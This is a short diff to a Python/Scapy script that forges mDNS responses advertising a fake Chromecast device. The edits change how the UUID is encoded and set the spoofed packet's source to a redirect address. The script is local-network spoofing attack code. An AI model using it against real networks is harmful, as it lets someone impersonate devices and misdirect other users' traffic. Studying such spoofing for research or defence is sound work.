@@ -44,8 +44,7 @@ def spoof_response(pkt):
     dot_local_loc = 'c' + hex(len(''.join(ans.split()))/2)[2:].zfill(3)
     ans += '05 6c 6f 63 61 6c 00 00 0c 00 01 00 00 00 78 00 2e'
     ans += '2b 43 68 72 6f 6d 65 63 61 73 74 2d'                            # Chromecast- prepend
-    #ans += binascii.hexlify(uuid_nodash)                                   # uuid
-    ans += '62 33 66 64 66 31 61 66 34 35 63 62 31 64 32 30 63 39 37 35 31 33 34 32 30 37 37 36 36 31 65 38' # uuid
+    ans += binascii.hexlify(uuid_nodash)                                   # uuid
     ans += 'c0 0c'                                                          # offset to .local
 
     data_length = 6 + 3 + len(uuid_nodash) + 3  + fn_len + 3 + 5 + 13 + 18  # num of lengths + weird field len + lengths + ve field len + len chromecast + len icon + 2 threes for xx=
@@ -98,7 +97,7 @@ def spoof_response(pkt):
     data_hex = ''.join(data_list).decode('hex')
 
     #spoofed_pkt = IP(src='192.168.1.104', dst='224.0.0.251')/UDP(dport='mdns', sport='mdns')/Raw(load=data_hex)
-    spoofed_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src)/UDP(dport='mdns', sport='mdns')/Raw(load=data_hex)
+    spoofed_pkt = IP(src=redirect_to, dst=pkt[IP].dst)/UDP(dport='mdns', sport='mdns')/Raw(load=data_hex)
     send(spoofed_pkt)
     print 'Sent spoofed response:', spoofed_pkt.summary()
 
